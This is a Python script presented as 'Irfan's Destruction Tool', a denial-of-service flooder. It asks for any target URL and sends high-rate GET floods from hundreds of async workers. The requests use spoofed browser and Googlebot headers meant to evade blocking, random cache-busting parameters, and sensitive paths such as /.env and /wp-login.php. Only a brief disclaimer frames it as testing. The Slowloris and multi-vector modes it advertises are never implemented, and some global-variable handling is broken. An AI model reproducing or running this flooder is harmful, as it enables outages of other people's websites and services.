#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║                    IRFAN'S DESTRUCTION TOOL v4.0             ║
║                    Advanced Attack System                    ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import random
import threading
import socket
import asyncio
import aiohttp
import urllib.parse
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.table import Table
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn
from rich import box
from rich.columns import Columns
from rich.layout import Layout
import colorama
from datetime import datetime

# Initialize
colorama.init(autoreset=True)
console = Console()

# ==================== GLOBAL VARIABLES ====================
MAX_THREADS = 500
MAX_RPS = 5000
ATTACKING = False
STATS = {'req': 0, 'success': 0, 'block': 0, 'error': 0, 'rps': 0, 'bytes': 0}
LOCK = threading.Lock()
START_TIME = 0
LAST_COUNT = 0
TARGET = ""
PROTOCOL = "http"
HOST = ""
PORT = 80
PATH = "/"
ATTACK_MODE = "http"
TOR_AVAILABLE = False

# Headers for bypass
BYPASS_HEADERS = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0'
    },
    {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'X-Requested-With': 'XMLHttpRequest'
    },
    {
        'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'From': 'googlebot(at)googlebot.com'
    }
]

# Attack paths
ATTACK_PATHS = [
    '/', '/index.php', '/home', '/main', '/default',
    '/wp-admin/', '/wp-login.php', '/wp-content/', '/wp-includes/',
    '/admin/', '/administrator/', '/login', '/signin',
    '/api/', '/api/v1/', '/api/v2/', '/graphql',
    '/user/', '/dashboard/', '/panel/', '/cp/',
    '/config/', '/configuration/', '/settings/',
    '/test/', '/debug/', '/phpinfo.php', '/info.php',
    '/.env', '/config.php', '/database.php', '/db.php',
    '/backup/', '/backup.zip', '/backup.sql',
    '/xmlrpc.php', '/wp-json/', '/rest-api/',
    '/server-status', '/status', '/health',
    '/images/', '/css/', '/js/', '/assets/',
    '/robots.txt', '/sitemap.xml', '/.git/HEAD'
]

# ==================== BANNER ====================
def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    
    banner = """
    ███████╗██╗  ██╗██████╗  █████╗ ███╗   ██╗    ██████╗ ███████╗███████╗████████╗██████╗  ██████╗ ██╗   ██╗
    ██╔════╝██║  ██║██╔══██╗██╔══██╗████╗  ██║    ██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗╚██╗ ██╔╝
    ███████╗███████║██████╔╝███████║██╔██╗ ██║    ██║  ██║█████╗  ███████╗   ██║   ██████╔╝██║   ██║ ╚████╔╝ 
    ╚════██║██╔══██║██╔══██╗██╔══██║██║╚██╗██║    ██║  ██║██╔══╝  ╚════██║   ██║   ██╔══██╗██║   ██║  ╚██╔╝  
    ███████║██║  ██║██║  ██║██║  ██║██║ ╚████║    ██████╔╝███████╗███████║   ██║   ██║  ██║╚██████╔╝   ██║   
    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   
    
    ════════════════════════════════════════════════════════════════════════════════════════════════════════
                            VERSION 4.0 | BY IRFAN | ADVANCED AUTONOMOUS MODE
    ════════════════════════════════════════════════════════════════════════════════════════════════════════
    """
    
    console.print(Panel.fit(banner, 
                          border_style="bold red", 
                          padding=(1, 2),
                          title="[bold yellow]🔥 IRFAN'S DESTRUCTION ENGINE 🔥[/]"))

# ==================== TARGET PARSER ====================
def parse_target(target):
    global PROTOCOL, HOST, PORT, PATH
    try:
        if not target:
            return False
            
        # Add protocol if missing
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        # Parse URL
        parsed = urllib.parse.urlparse(target)
        PROTOCOL = parsed.scheme
        HOST = parsed.hostname
        
        if not HOST:
            console.print("[red]✗ Invalid target URL![/]")
            return False
        
        # Set port
        if parsed.port:
            PORT = parsed.port
        else:
            PORT = 443 if PROTOCOL == 'https' else 80
        
        # Set path
        PATH = parsed.path or '/'
        
        # Show parsed info
        console.print(f"\n[green]✅ Target successfully parsed![/]")
        console.print(f"[cyan]🔗 Full URL:[/] {PROTOCOL}://{HOST}:{PORT}{PATH}")
        console.print(f"[cyan]🌐 Protocol:[/] {PROTOCOL.upper()}")
        console.print(f"[cyan]🎯 Host:[/] {HOST}")
        console.print(f"[cyan]🚪 Port:[/] {PORT}")
        console.print(f"[cyan]📁 Path:[/] {PATH}")
        
        return True
        
    except Exception as e:
        console.print(f"[red]✗ Error parsing target: {e}[/]")
        return False

# ==================== TARGET INPUT ====================
def get_target():
    """Get target URL from user with examples"""
    
    # Show examples
    examples_panel = Panel.fit(
        "[bold cyan]📋 EXAMPLE TARGET FORMATS:[/]\n\n"
        "[yellow]1. Full URL:[/] https://example.com\n"
        "[yellow]2. With path:[/] http://test.com/admin\n"
        "[yellow]3. Just domain:[/] example.org\n"
        "[yellow]4. With port:[/] http://localhost:8080\n"
        "[yellow]5. IP address:[/] http://192.168.1.1\n\n"
        "[green]💡 Tip:[/] You can use any of these formats!",
        border_style="bold blue",
        padding=(1, 2)
    )
    
    console.print(examples_panel)
    
    # Get target
    console.print("\n[bold yellow]🎯 ENTER TARGET URL[/]")
    console.print("[cyan]Enter the website URL you want to test:[/]")
    
    target = input("\n👉 Target URL: ").strip()
    
    if not target:
        console.print("[red]✗ No target provided! Please enter a valid URL.[/]")
        return None
    
    return target

# ==================== CONFIGURATION MENU ====================
def configuration_menu():
    """Show configuration options"""
    
    config_panel = Panel.fit(
        "[bold cyan]⚙️  ATTACK CONFIGURATION[/]\n\n"
        f"[yellow]Current Settings:[/]\n"
        f"• Threads: [green]{MAX_THREADS}[/]\n"
        f"• RPS Limit: [green]{MAX_RPS}[/]\n"
        f"• Attack Mode: [green]{ATTACK_MODE.upper()}[/]\n\n"
        "[cyan]Press Enter to use defaults, or configure:[/]",
        border_style="bold yellow",
        padding=(1, 2)
    )
    
    console.print(config_panel)
    
    # Threads configuration
    threads_input = input(f"Threads [{MAX_THREADS}]: ").strip()
    if threads_input.isdigit():
        global MAX_THREADS
        MAX_THREADS = int(threads_input)
        console.print(f"[green]✓ Threads set to: {MAX_THREADS}[/]")
    
    # RPS configuration
    rps_input = input(f"RPS Limit [{MAX_RPS}]: ").strip()
    if rps_input.isdigit():
        global MAX_RPS
        MAX_RPS = int(rps_input)
        console.print(f"[green]✓ RPS limit set to: {MAX_RPS}[/]")
    
    # Attack mode
    console.print("\n[cyan]🎯 SELECT ATTACK MODE:[/]")
    console.print("[yellow]1.[/] HTTP Flood (Default)")
    console.print("[yellow]2.[/] Slowloris")
    console.print("[yellow]3.[/] Multi-Vector")
    
    mode_input = input("\nSelect mode [1-3]: ").strip()
    global ATTACK_MODE
    
    if mode_input == '2':
        ATTACK_MODE = "slowloris"
        console.print("[green]✓ Attack mode: SLOWLORIS[/]")
    elif mode_input == '3':
        ATTACK_MODE = "multi"
        console.print("[green]✓ Attack mode: MULTI-VECTOR[/]")
    else:
        ATTACK_MODE = "http"
        console.print("[green]✓ Attack mode: HTTP FLOOD[/]")

# ==================== ASYNC ATTACK WORKER ====================
class AsyncAttacker:
    def __init__(self):
        self.session = None
        self.success = 0
        self.errors = 0
    
    async def create_session(self):
        """Create async HTTP session"""
        timeout = aiohttp.ClientTimeout(total=10)
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        headers = random.choice(BYPASS_HEADERS)
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=headers
        )
    
    async def send_request(self):
        """Send single attack request"""
        try:
            if not self.session:
                await self.create_session()
            
            # Random path selection with parameters
            path = random.choice(ATTACK_PATHS)
            
            # Add random parameters
            params = ""
            if random.random() > 0.3:
                params = f"?_={random.randint(10000, 99999)}"
                if random.random() > 0.5:
                    params += f"&cache={random.randint(1, 1000)}"
            
            # Build URL
            if PORT in [80, 443]:
                url = f"{PROTOCOL}://{HOST}{path}{params}"
            else:
                url = f"{PROTOCOL}://{HOST}:{PORT}{path}{params}"
            
            # Send request
            async with self.session.get(url, ssl=False) as response:
                data = await response.read()
                
                with LOCK:
                    STATS['bytes'] += len(data)
                
                # Check response
                if 200 <= response.status < 400:
                    return 'success'
                elif response.status in [403, 429, 503]:
                    return 'block'
                else:
                    return 'success'
                    
        except aiohttp.ClientError:
            return 'error'
        except Exception:
            return 'error'
    
    async def attack_loop(self):
        """Main attack loop"""
        while ATTACKING:
            result = await self.send_request()
            
            with LOCK:
                STATS['req'] += 1
                if result == 'success':
                    STATS['success'] += 1
                elif result == 'block':
                    STATS['block'] += 1
                else:
                    STATS['error'] += 1
            
            # Rate limiting
            if MAX_RPS > 0:
                await asyncio.sleep(1.0 / MAX_RPS)

# ==================== STATS DISPLAY ====================
def display_stats():
    """Display real-time statistics"""
    global LAST_COUNT
    
    with Live(refresh_per_second=4, screen=False) as live:
        while ATTACKING:
            time.sleep(0.25)
            
            with LOCK:
                total = STATS['req']
                elapsed = time.time() - START_TIME
                current_rps = (total - LAST_COUNT) / 0.25 if elapsed > 0 else 0
                LAST_COUNT = total
                STATS['rps'] = max(STATS['rps'], current_rps)
                
                # Calculate MB/s
                mbps = (STATS['bytes'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
            
            success_rate = (STATS['success'] / max(total, 1)) * 100
            
            # Create table
            table = Table(title=f"🚀 LIVE ATTACK IN PROGRESS | {ATTACK_MODE.upper()} MODE", 
                         box=box.DOUBLE_EDGE, 
                         title_style="bold magenta",
                         header_style="bold cyan")
            
            table.add_column("METRIC", style="yellow", width=18)
            table.add_column("VALUE", style="green", width=15)
            table.add_column("STATUS", style="magenta", width=22)
            
            table.add_row("🎯 TARGET", f"{HOST}", f"Port: {PORT}")
            table.add_row("⚡ LIVE RPS", f"{int(current_rps):,}", f"Limit: {MAX_RPS:,}")
            table.add_row("📊 BANDWIDTH", f"{mbps:.1f} MB/s", "")
            table.add_row("📨 TOTAL REQ", f"{total:,}", "")
            table.add_row("✅ SUCCESS", f"{STATS['success']:,}", f"Rate: {success_rate:.1f}%")
            table.add_row("🚫 BLOCKED", f"{STATS['block']:,}", "")
            table.add_row("❌ ERRORS", f"{STATS['error']:,}", "")
            table.add_row("💾 BYTES SENT", f"{STATS['bytes']/1024/1024:.1f} MB", "")
            table.add_row("⏱️  UPTIME", f"{int(elapsed)}s", f"Peak: {int(STATS['rps']):,} RPS")
            table.add_row("🔧 MODE", f"{ATTACK_MODE.upper()}", "")
            
            live.update(table)

# ==================== ATTACK LAUNCHER ====================
def launch_attack():
    """Launch the main attack"""
    global ATTACKING, START_TIME
    
    # Show attack summary
    summary = Panel.fit(
        f"[bold red]💀 ATTACK SUMMARY[/]\n\n"
        f"[cyan]Target:[/] {PROTOCOL}://{HOST}:{PORT}{PATH}\n"
        f"[cyan]Threads:[/] {MAX_THREADS}\n"
        f"[cyan]RPS Limit:[/] {MAX_RPS}\n"
        f"[cyan]Mode:[/] {ATTACK_MODE.upper()}\n\n"
        f"[yellow]Press Ctrl+C to stop the attack[/]",
        border_style="bold red",
        padding=(1, 2)
    )
    
    console.print(summary)
    
    # Countdown
    console.print("[yellow]🚀 Launching attack in:[/]")
    for i in range(3, 0, -1):
        console.print(f"[red]{i}...[/]")
        time.sleep(1)
    
    # Start attack
    ATTACKING = True
    START_TIME = time.time()
    
    # Start stats display in separate thread
    stats_thread = threading.Thread(target=display_stats, daemon=True)
    stats_thread.start()
    
    # Start async attack
    async def start_async_attack():
        # Create workers (limit to reasonable number)
        worker_count = min(MAX_THREADS, 300)  # Max 300 workers for stability
        workers = [AsyncAttacker() for _ in range(worker_count)]
        
        # Start attack loops
        tasks = [worker.attack_loop() for worker in workers]
        await asyncio.gather(*tasks)
    
    # Run attack
    try:
        asyncio.run(start_async_attack())
    except KeyboardInterrupt:
        stop_attack()
    except Exception as e:
        console.print(f"[red]✗ Attack error: {e}[/]")
        stop_attack()

# ==================== STOP ATTACK ====================
def stop_attack():
    """Stop the attack and show report"""
    global ATTACKING
    
    ATTACKING = False
    console.print("\n[yellow]⚠️  Stopping attack... Please wait[/]")
    time.sleep(2)
    
    # Final report
    total = STATS['req']
    elapsed = time.time() - START_TIME
    success_rate = (STATS['success'] / max(total, 1)) * 100
    avg_rps = total / elapsed if elapsed > 0 else 0
    mbps = (STATS['bytes'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
    
    report = f"""
    ╔══════════════════════════════════════════════════════════════╗
    ║                   ATTACK COMPLETE - BY IRFAN                 ║
    ╠══════════════════════════════════════════════════════════════╣
    ║  🎯 Target:     {PROTOCOL}://{HOST}:{PORT}{PATH:<15} ║
    ║  ⏱️  Duration:   {int(elapsed)} seconds{'':<22} ║
    ║  📊 Total Requests: {total:,}{'':<25} ║
    ║  ⚡ Average RPS:    {int(avg_rps):,}{'':<25} ║
    ║  📈 Peak RPS:      {int(STATS['rps']):,}{'':<25} ║
    ║  ✅ Success Rate:  {success_rate:.1f}%{'':<28} ║
    ║  💾 Bandwidth:     {mbps:.1f} MB/s{'':<24} ║
    ║  📦 Bytes Sent:    {STATS['bytes']/1024/1024:.1f} MB{'':<20} ║
    ║  🔧 Attack Mode:   {ATTACK_MODE.upper()}{'':<24} ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    
    console.print(Panel.fit(report, 
                          border_style="bold green", 
                          padding=(1, 2),
                          title="[bold yellow]📊 FINAL REPORT[/]"))

# ==================== MAIN MENU ====================
def main_menu():
    """Main menu"""
    show_banner()
    
    # Show welcome message
    welcome = Panel.fit(
        "[bold cyan]Welcome to IRFAN'S DESTRUCTION TOOL v4.0[/]\n\n"
        "[yellow]⚠️  WARNING:[/] This tool is for educational and authorized testing only!\n"
        "[yellow]🔒 SECURITY:[/] Use only on systems you own or have permission to test.\n\n"
        "[green]Press Enter to continue...[/]",
        border_style="bold cyan",
        padding=(1, 2)
    )
    
    console.print(welcome)
    input()
    
    # Get target URL
    target = get_target()
    if not target:
        console.print("[red]✗ No valid target provided. Exiting...[/]")
        sys.exit(1)
    
    # Parse target
    if not parse_target(target):
        console.print("[red]✗ Failed to parse target. Exiting...[/]")
        sys.exit(1)
    
    # Configuration
    configuration_menu()
    
    # Confirm attack
    confirm_panel = Panel.fit(
        f"[bold yellow]⚠️  FINAL CONFIRMATION[/]\n\n"
        f"[cyan]Target:[/] {PROTOCOL}://{HOST}:{PORT}{PATH}\n"
        f"[cyan]Threads:[/] {MAX_THREADS}\n"
        f"[cyan]RPS:[/] {MAX_RPS}\n"
        f"[cyan]Mode:[/] {ATTACK_MODE.upper()}\n\n"
        f"[red]Are you sure you want to launch the attack?[/]\n"
        f"[green]Type 'YES' to confirm, anything else to cancel:[/]",
        border_style="bold yellow",
        padding=(1, 2)
    )
    
    console.print(confirm_panel)
    confirmation = input("\n👉 Confirmation: ").strip().upper()
    
    if confirmation != 'YES':
        console.print("[yellow]✗ Attack cancelled by user.[/]")
        sys.exit(0)
    
    # Launch attack
    launch_attack()
    
    # Ask for another attack
    restart_panel = Panel.fit(
        "[bold cyan]🔄 ANOTHER ATTACK?[/]\n\n"
        "[green]Do you want to launch another attack?[/]\n"
        "[yellow]Type 'Y' for yes, 'N' for no:[/]",
        border_style="bold cyan",
        padding=(1, 2)
    )
    
    console.print(restart_panel)
    restart = input("\n👉 Choice: ").strip().upper()
    
    if restart == 'Y':
        # Reset stats
        global STATS
        STATS = {'req': 0, 'success': 0, 'block': 0, 'error': 0, 'rps': 0, 'bytes': 0}
        main_menu()
    else:
        console.print("[green]👋 Thank you for using IRFAN'S DESTRUCTION TOOL![/]")
        sys.exit(0)

# ==================== MAIN ====================
def main():
    """Main function"""
    try:
        main_menu()
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️  Program interrupted by user.[/]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[red]✗ Unexpected error: {e}[/]")
        sys.exit(1)

if __name__ == "__main__":
    main()